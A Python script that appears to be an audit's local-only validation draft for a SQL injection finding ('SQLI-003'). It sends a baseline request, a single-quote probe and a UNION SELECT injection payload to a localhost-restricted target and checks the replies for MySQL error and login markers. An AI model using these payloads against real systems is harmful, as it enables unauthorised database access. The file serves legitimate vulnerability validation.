#!/usr/bin/env python3
# -*- coding: utf-8 -*-
'''SQLI-003 local-only SQL injection validation draft.

Manual adaptation required: confirm the real request path that reaches the
audited snippet, the users-table column count and the session/cookie source.
Only localhost, 127.0.0.1 or ::1 are accepted; redirects are not followed.
'''

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = ('localhost', '127.0.0.1', '::1')


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def load_session_headers(path):
    if not path:
        return {}
    with open(path, 'r', encoding='utf-8') as fh:
        data = json.load(fh)
    headers = {}
    for key in ('Cookie', 'Authorization'):
        if isinstance(data.get(key), str):
            headers[key] = data[key]
    return headers


def build_url(base_url, path, param, value):
    parts = urllib.parse.urlsplit(base_url)
    if parts.scheme not in ('http', 'https'):
        raise ValueError('base URL must use http or https')
    if parts.hostname not in ALLOWED_HOSTS:
        raise ValueError('only localhost, 127.0.0.1 or ::1 are allowed')
    query = urllib.parse.urlencode({param: value})
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, path, query, ''))


def fetch(url, headers, timeout):
    request = urllib.request.Request(url, headers=headers, method='GET')
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(request, timeout=timeout) as response:
            return response.status, response.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode('utf-8', 'replace')


def main():
    parser = argparse.ArgumentParser(description='SQLI-003 local validation draft')
    parser.add_argument('--base-url', required=True, help='e.g. http://127.0.0.1:8080')
    parser.add_argument('--path', required=True, help='request path of the audited script')
    parser.add_argument('--param', default='id', help='GET parameter name taken from the code')
    parser.add_argument('--normal-value', default='1', help='normal numeric id')
    parser.add_argument('--probe-value', default="1'", help='single-quote syntax probe')
    parser.add_argument('--union-value', default="9999' UNION SELECT 1,'sqli_marker',3-- -", help='union probe, adjust column count to the real schema')
    parser.add_argument('--session-file', default=None, help='local JSON file holding Cookie/Authorization')
    parser.add_argument('--timeout', type=float, default=10.0)
    args = parser.parse_args()

    headers = load_session_headers(args.session_file)
    cases = (
        ('baseline', args.normal_value),
        ('quote_probe', args.probe_value),
        ('union_probe', args.union_value),
    )
    for label, value in cases:
        try:
            url = build_url(args.base_url, args.path, args.param, value)
        except ValueError as exc:
            print('%s: scope error: %s' % (label, exc))
            return 2
        try:
            status, body = fetch(url, headers, args.timeout)
        except urllib.error.URLError as exc:
            print('%s: connection error: %s' % (label, exc.reason))
            continue
        print('== %s ==' % label)
        print('http_status: %s' % status)
        print('login_marker: %s' % ('Your Login name:' in body))
        print('mysql_error_marker: %s' % ('SQL syntax' in body or 'Warning: mysql' in body))
        print('body_excerpt:')
        print(body[:600])
        print()
    return 0


if __name__ == '__main__':
    sys.exit(main())
